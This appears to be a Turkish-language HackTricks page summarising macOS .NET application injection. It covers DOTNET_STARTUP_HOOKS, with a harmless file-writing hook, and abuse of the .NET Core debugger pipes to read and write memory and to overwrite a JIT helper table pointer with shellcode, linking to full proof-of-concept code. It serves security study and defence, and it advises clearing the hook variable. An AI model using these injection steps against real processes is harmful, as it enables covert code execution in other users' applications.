# macOS .Net Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/) gönderisinin bir özetidir. Daha fazla ayrıntı için inceleyin!**<sup>[[1]](#references)</sup>

## `DOTNET_STARTUP_HOOKS`

.NET Core 3.0 ve sonraki sürümler `DOTNET_STARTUP_HOOKS` environment variable'ını destekler. Her path, global bir `StartupHook` type'ı ve `public static void Initialize()` method'u içeren bir managed assembly belirtmelidir. Host, assembly'leri yükler ve uygulamanın `Main` entry point'inden önce initializer'larını senkron şekilde çağırır; bu da environment control ile birlikte okunabilir bir DLL'e doğrudan pre-main code-execution primitive'i sağlar.<sup>[[2]](#references)</sup>
```csharp
// StartupHook.cs — compile as a class-library assembly.
using System.IO;

internal class StartupHook
{
public static void Initialize()
{
File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
}
}
```

```bash
dotnet new classlib -n StartupHookPayload -f net8.0
cp StartupHook.cs StartupHookPayload/Class1.cs
dotnet build StartupHookPayload -c Release

DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
dotnet /path/to/TargetApplication.dll
```
Hook assembly, uygulamanın runtime'ı ve dependencies ile uyumlu olmalıdır. Directory separator içeren relative path'ler reddedilir; absolute path veya default load context'ten çözümlenebilen bir assembly name kullanın. Startup hooks, trimmed uygulamalarda varsayılan olarak devre dışıdır ve custom native host'lar environment'ı devralmak yerine runtime properties değerlerini doğrudan sağlayabilir.<sup>[[2]](#references)</sup>

Defensive launcher'lar `DOTNET_STARTUP_HOOKS` değerini temizlemeli, application ve shared assembly path'lerine güvenilmeyen yazma işlemlerini engellemeli ve self-contained ile trimmed deployment'ları ayrı ayrı test etmelidir.

## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Bir Debugging Session Oluşturma** <a href="#net-core-debugging" id="net-core-debugging"></a>

.NET'te debugger ile debuggee arasındaki iletişimin yönetimi [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) tarafından gerçekleştirilir. Bu component, [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) dosyasında görüldüğü üzere her .NET process'i için iki named pipe oluşturur; bunlar [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) üzerinden başlatılır. Bu pipe'ler **`-in`** ve **`-out`** suffix'leriyle sonlandırılır.

Kullanıcının **`$TMPDIR`** dizinine giderek .Net uygulamalarında debugging için kullanılabilen FIFO'lar bulunabilir.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259), bir debugger'dan gelen iletişimi yönetmekten sorumludur. Yeni bir debugging session başlatmak için debugger, .NET source code'da ayrıntıları verilen `MessageHeader` struct'ı ile başlayan bir mesajı `out` pipe'ı üzerinden göndermelidir:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Yeni bir session talep etmek için bu struct aşağıdaki şekilde doldurulur; message type `MT_SessionRequest` ve protocol version geçerli sürüm olarak ayarlanır:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Bu header daha sonra `write` syscall kullanılarak hedefe gönderilir; ardından oturum için bir GUID içeren `sessionRequestData` struct'ı gönderilir:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
`out` pipe üzerinden gerçekleştirilen bir okuma işlemi, debugging session kurulumunun başarılı veya başarısız olduğunu doğrular:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Belleği Okuma

Bir debugging session oluşturulduktan sonra, bellek [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) message type kullanılarak okunabilir. `readMemory` function'ı ayrıntılı olarak ele alınmış olup bir read request göndermek ve response'u almak için gerekli adımları gerçekleştirir:
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Eksiksiz proof of concept (POC) [burada](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b) bulunabilir.

## Bellek Yazma

Benzer şekilde, `writeMemory` function kullanılarak belleğe yazılabilir. İşlem, message type değerinin `MT_WriteMemory` olarak ayarlanmasını, verilerin adresinin ve uzunluğunun belirtilmesini ve ardından verilerin gönderilmesini içerir:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
The associated POC [burada](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5) mevcuttur.

## .NET Core Code Execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Code execute etmek için rwx izinlerine sahip bir memory region belirlemek gerekir; bu işlem `vmmap -pages` kullanılarak yapılabilir:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Bir function pointer'ı overwrite edebileceğiniz bir yer bulmak gereklidir ve .NET Core'da bu işlem **Dynamic Function Table (DFT)** hedeflenerek gerçekleştirilebilir. [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h) dosyasında ayrıntılı olarak açıklanan bu tablo, runtime tarafından JIT compilation helper functions için kullanılır.

x64 sistemlerde, `libcorclr.dll` içindeki `_hlpDynamicFuncTable` sembolüne bir referans bulmak için signature hunting kullanılabilir.

`MT_GetDCB` debugger function'ı, `m_helperRemoteStartAddr` adlı bir helper function'ın adresi de dahil olmak üzere faydalı bilgiler sağlar; bu adres, `libcorclr.dll`'in process memory içindeki konumunu belirtir. Bu adres daha sonra DFT için arama başlatmak ve bir function pointer'ı shellcode'un adresiyle overwrite etmek için kullanılır.

PowerShell'e injection için tam POC koduna [buradan](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6) erişilebilir.

## References

- [1] [Adam Chester (xpnsec) - Third Party Frameworks üzerinden macOS Injection](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [2] [.NET runtime host startup hook tasarımı](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
{{#include ../../../banners/hacktricks-training.md}}
